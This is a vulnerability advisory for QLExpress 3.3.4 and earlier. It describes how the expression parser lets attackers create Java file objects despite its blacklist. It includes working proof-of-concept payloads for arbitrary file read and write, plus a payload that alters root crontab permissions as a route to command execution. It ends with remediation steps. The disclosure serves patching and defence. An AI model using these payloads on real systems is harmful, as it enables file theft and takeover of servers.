# QLExpress arbitrary file write/read (≤ v3.3.4)

**Product**: QLExpress
**Affected Versions**: ≤ v3.3.4
**address**: https://github.com/alibaba/QLExpress

## Vulnerability Description

QLExpress versions 3.3.4 and below do not restrict the creation of new objects when parsing expressions even though the blacklist prohibits most dangerous classes, which allow attackers to create File objects to read and write arbitrary files.

## POC

### Arbitrary file read

payload

```java
is = new java.io.FileInputStream("C:/windows/win.ini");buffer = new byte[is.available()];is.read(buffer);content = new String(buffer);is.close();content;
```

<img width="1817" height="908" alt="image" src="https://github.com/user-attachments/assets/decf3871-6724-40cf-a986-354d6e5dd6d5" />


### Arbitrary file write

payload

```java
os = new java.io.FileOutputStream("D:/flag.txt");content = "flag123";os.write(content.getBytes());os.close();
```

<img width="1812" height="917" alt="image" src="https://github.com/user-attachments/assets/dbb91907-cd96-4fd4-95f9-cfbade37afac" />


## Impact

Arbitrary file writing may lead to remote command execution.Because Java has root privileges in Linux generally, attackers can write to cron jobs and SSH public keys.
In Ubuntu cron jobs, you need to change the file attribute to 0600 for it to be executed.
payload:

```java
file = new java.io.File(\"/var/spool/cron/crontabs/root\");readableSet = file.setReadable(false, false);readableOwner = file.setReadable(true, true);writableSet = file.setWritable(false, false);writableOwner = file.setWritable(true, true);executableSet = file.setExecutable(false, false);executableOwner = file.setExecutable(false, true);
```

## 
## remediation

1.Filter user input before parsing it directly with QLExpress.

2.Using QLExpress4, it prevents the creation of new objects.
